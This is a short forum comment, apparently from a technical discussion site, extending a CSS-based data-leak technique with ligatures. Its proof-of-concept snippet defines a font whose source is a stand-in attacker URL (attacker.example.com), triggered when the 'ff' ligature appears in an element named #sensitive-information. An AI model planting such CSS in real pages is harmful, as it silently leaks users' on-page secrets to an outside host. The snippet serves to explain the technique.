Nice, and by using &#x27;font-variant-ligatures: common-ligatures;&#x27; you can actually try to harvest character combinations as well. For example:<p><pre><code>  @font-face {
    font-family: poc;
    src: url(http://attacker.example.com/?ff); /* ff */
    unicode-range: U+FB00;
  }

  #sensitive-information {
    font-family: poc;
    font-variant-ligatures: common-ligatures; 
  }
</code></pre>
